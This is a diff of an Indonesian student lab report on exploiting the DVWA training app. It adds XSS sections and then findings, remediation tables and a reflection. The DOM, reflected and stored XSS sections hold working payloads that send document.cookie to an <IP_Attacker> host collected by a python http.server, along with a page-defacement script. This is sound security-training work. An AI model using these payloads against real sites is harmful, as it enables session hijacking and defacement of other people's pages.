@@ -19,8 +19,8 @@ Tujuan dari praktikum ini adalah **mengidentifikasi dan mengeksploitasi kerentan
 - **Tools Utama**:
   - Firefox/Chrome DevTools
   - Burp Suite
-  - OWASP ZAP
   - Nmap
+  - Sqlmap
 
 - **VM/Lab Environment**:
   - DVWA (Docker container)
@@ -172,48 +172,97 @@ Metode pengujian mengacu pada standar **NIST SP 800-115**:
   ![alt text](images/01_dvwa/image-15.png)
   ![alt text](images/01_dvwa/image-16.png)
 
-### 10. DOM Based Cross Site Scripting (XSS)
-- 
+### 8. DOM Based Cross Site Scripting (XSS)
+- buka ```http://<IP_Server>/DVWA/vulnerabilities/xss_d/?default=<script>alert(document.cookie);</script>```
+  ![alt text](images/01_dvwa/image-17.png)
+- Membuat halaman untuk menampung cookie
+  ```python3 -m http.server 80```
+- Melakukan pencurian cookie dan kirim ke halaman penampung
+  ```http://<IP_Server>/DVWA/vulnerabilities/xss_d/?default=<script>window.location='http://<IP_Attacker>/?cookie='+document.cookie</script>```
+  ![alt text](images/01_dvwa/image-18.png)
 
-### 11. Reflected Cross Site Scripting (XSS)
-- 
+### 9. Reflected Cross Site Scripting (XSS)
+- Reflected cross-site scripting (XSS) muncul saat aplikasi menerima data dalam permintaan HTTP dan menyertakan data tersebut dalam respons langsung dengan cara yang tidak aman.
+- menampilkan alert
+  ```<script>alert("test")</script>```
+  ![alt text](images/01_dvwa/image-19.png)
+- Menampilkan cookie halaman
+  ```<input onfocus=javascript:alert(document.cookie) autofocus>```
+  ![alt text](images/01_dvwa/image-20.png)
+- Melakukan pencurian cookie
+  ```<input onfocus=javascript:window.location='http://<IP_Attacker>/?cookie='+document.cookie autofocus>```
+  ![alt text](images/01_dvwa/image-21.png)
+- bisa juga test deface pake script sederhana
+  ```js
+  <script>
+    const defaceDiv = document.createElement("div");
+    defaceDiv.style = "height:100vh;background:black;color:lime;display:flex;justify-content:center;align-items:center;flex-direction:column;margin-top:20px;";
+    defaceDiv.innerHTML = `
+      <h1 style="font-size:3em;">Hacked by test</h1>
+      <p style="font-size:1.5em;">This page was defaced using XSS</p>
+    `;
+    document.body.appendChild(defaceDiv);
+  </script>
+  ```
+  ![alt text](images/01_dvwa/image-23.png)
 
-### 12. Reflected Cross Site Scripting (XSS)
-- 
+### 10. Stored Cross Site Scripting (XSS)
+- XSS Stored atau Persistent XSS muncul saat aplikasi menerima data dari sumber yang tidak tepercaya dan menyertakan data tersebut dalam respons HTTP selanjutnya dengan cara yang tidak aman.
+- Sebelum melakukan uji serangan, ubah maxlength pada textarea dari 50 menjadi 500 karakter melalui inspect element
+  ![alt text](images/01_dvwa/image-22.png)
+- Masukkan script ini ke field Message
+  ```<script>window.location='http://<IP_Server>/?cookie='+document.cookie</script>```
+- tiap ada orang yang buka url web yang terkana xss stored maka dia cookienya akan dikirimkan ke ip attacker
+  ![alt text](images/01_dvwa/image-24.png)
 
 ---
 
 ## 6. Temuan dan Analisis
-
-| No | Jenis Kerentanan  | Deskripsi Temuan                  | Dampak                         | Bukti                    |
-| -- | ----------------- | --------------------------------- | ------------------------------ | ------------------------ |
-| 1  | SQL Injection     | Parameter `id` tidak divalidasi   | Akses database tanpa otorisasi | gambar |
+| No | Jenis Kerentanan     | Deskripsi Temuan                                       | Dampak                                | Bukti  |
+| -- | -------------------- | ------------------------------------------------------ | ------------------------------------- | ------ |
+| 1  | Brute Force          | Tidak ada limitasi percobaan login                     | Akses akun pengguna tanpa izin        | ![alt text](images/01_dvwa/image-1.png) |
+| 2  | Command Injection    | Input shell tidak disanitasi                           | Eksekusi perintah di server           | ![alt text](images/01_dvwa/image-3.png) |
+| 3  | CSRF                 | Tidak ada proteksi token CSRF                          | Pengubahan data tanpa izin            | ![alt text](images/01_dvwa/image-11.png) |
+| 4  | File Inclusion (LFI) | Parameter `page` bisa diisi path file sistem           | Akses file sensitif di server         | ![alt text](images/01_dvwa/image-12.png) |
+| 5  | File Upload          | Tidak ada filter ekstensi file yang di-upload          | Eksekusi kode jarak jauh (RCE)        | ![alt text](images/01_dvwa/image-14.png) |
+| 6  | SQL Injection        | Parameter `id` tidak divalidasi                        | Akses database tanpa otorisasi        | ![alt text](images/01_dvwa/image-6.png) |
+| 7  | Blind SQL Injection  | Parameter rentan terhadap SQLi tanpa feedback langsung | Akses database secara tersembunyi     | ![alt text](images/01_dvwa/image-16.png) |
+| 8  | DOM-Based XSS        | Script dapat dijalankan dari URL                       | Pencurian cookie atau deface          | ![alt text](images/01_dvwa/image-18.png) |
+| 9  | Reflected XSS        | Input langsung dirender tanpa sanitasi                 | Eksekusi JavaScript di browser user   | ![alt text](images/01_dvwa/image-19.png) |
+| 10 | Stored XSS           | Data disimpan dan dirender tanpa sanitasi              | Eksekusi kode permanen di banyak user | ![alt text](images/01_dvwa/image-24.png) |
 
 ---
 
 ## 7. Rekomendasi Perbaikan
-
-- Gunakan **prepared statement** untuk semua query SQL
+| No | Jenis Kerentanan         | Rekomendasi Teknis                                                                                                                                                                                                |
+| -- | ------------------------ | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| 1  | **Brute Force**          | - Implementasikan rate-limiting pada endpoint login (misalnya, max 5 attempt per IP/user dalam 10 menit).<br>- Tambahkan captcha atau delay antar percobaan login.<br>- Log aktivitas login yang mencurigakan.    |
+| 2  | **Command Injection**    | - Validasi input dengan whitelist (hanya izinkan IP/hostname tertentu).<br>- Gunakan fungsi `escapeshellarg()` atau `proc_open()` yang lebih aman.<br>- Hindari menggunakan shell command jika tidak perlu.       |
+| 3  | **CSRF**                 | - Implementasikan **CSRF token** unik untuk setiap form.<br>- Validasi token di sisi server.<br>- Gunakan metode `POST` untuk tindakan penting, bukan `GET`.                                                      |
+| 4  | **File Inclusion (LFI)** | - Gunakan whitelist file yang dapat di-include.<br>- Validasi dan sanitasi input dengan ketat (hindari `../`).<br>- Hindari menampilkan error message yang terlalu detail.                                        |
+| 5  | **File Upload**          | - Batasi jenis file yang diizinkan (misalnya hanya `.jpg`, `.png`).<br>- Simpan file dengan nama acak dan tanpa eksekusi langsung.<br>- Nonaktifkan eksekusi file di folder upload (`.htaccess`, `nginx config`). |
+| 6  | **SQL Injection**        | - Gunakan **prepared statements** / **parameterized queries**.<br>- Hindari menyisipkan input user langsung ke dalam query SQL.<br>- Validasi tipe data input (misal `id` harus angka).                           |
+| 7  | **Blind SQL Injection**  | - Sama seperti di atas, gunakan prepared statements.<br>- Tambahkan logging dan alert untuk deteksi query mencurigakan.                                                                                           |
+| 8  | **DOM-Based XSS**        | - Jangan manipulasi DOM berdasarkan input URL tanpa validasi.<br>- Gunakan DOMPurify untuk membersihkan input HTML/JS dari user.                                                                                  |
+| 9  | **Reflected XSS**        | - Lakukan *output encoding* untuk semua data user sebelum ditampilkan.<br>- Gunakan framework yang sudah aman secara default (misal React, Laravel).                                                              |
+| 10 | **Stored XSS**           | - Escape seluruh karakter khusus HTML (`<`, `>`, `"` dll) sebelum menyimpan atau menampilkan kembali.<br>- Validasi dan sanitasi input user.<br>- Gunakan Content Security Policy (CSP).                          |
 
 ---
 
 ## 8. Evaluasi dan Refleksi
-- **Tantangan Utama:**
-  Memahami bagaimana payload yang sederhana dapat mengeksploitasi celah keamanan di aplikasi web.
-- **Tools yang Tidak Sesuai Ekspektasi:**
-  OWASP ZAP tidak berhasil menangkap semua request karena konfigurasi proxy belum disesuaikan dengan benar.
-- **Pelajaran Penting:**
-  Validasi input adalah pertahanan utama dalam pengembangan aplikasi web yang aman. Selain itu, penggunaan tools seperti Burp Suite sangat membantu dalam identifikasi kerentanan.
+### Tantangan Utama
 
----
+- Tantangan terbesar dalam proses pengujian ini adalah memahami bagaimana payload sederhana bisa dimanfaatkan untuk mengeksploitasi berbagai jenis kerentanan.
+- Beberapa kerentanan membutuhkan kombinasi teknik atau urutan langkah tertentu agar berhasil, seperti pada Blind SQL Injection dan Stored XSS.
+- Mengatur lingkungan lab DVWA dan memahami alur data di dalam aplikasi juga menjadi bagian penting dari proses.
 
-## 9. Lampiran
+### Pelajaran Penting
+- **Validasi dan sanitasi input** merupakan fondasi utama dalam menjaga keamanan aplikasi web. Banyak serangan dapat dicegah hanya dengan memvalidasi data dari pengguna.
+- **Burp Suite** sangat efektif dalam analisis request/response serta pengujian manual terhadap parameter-parameter yang rentan.
+- **Pemahaman logika aplikasi** penting untuk mengetahui bagian mana yang paling berisiko diserang, terutama untuk serangan seperti CSRF dan File Upload.
+- Penerapan **defense in depth** seperti CSRF token, prepared statement, CSP, dan filter file upload terbukti sangat penting dalam mencegah eksploitasi celah.
 
-> 📎 Sertakan screenshot berikut (dapat ditambahkan sebagai gambar markdown atau file terpisah):
-
-- SQL Injection (screenshot request & response)
-  IMG
-- XSS pop-up
-- Command Injection output
-- CSRF exploit HTML
-- Hasil scan Nmap (log atau screenshot)
+### Refleksi Keseluruhan
+- Kegiatan ini memberikan wawasan nyata bahwa banyak aplikasi web rentan karena asumsi bahwa pengguna akan selalu berperilaku sesuai aturan.
+- Pengujian secara langsung terhadap kerentanan menunjukkan betapa mudahnya data atau kontrol server dapat diambil alih ketika tidak ada mekanisme proteksi yang memadai.
+- Melalui eksploitasi terhadap DVWA, pengetahuan tentang keamanan aplikasi menjadi lebih praktikal dan aplikatif untuk diterapkan dalam pengembangan aplikasi nyata.
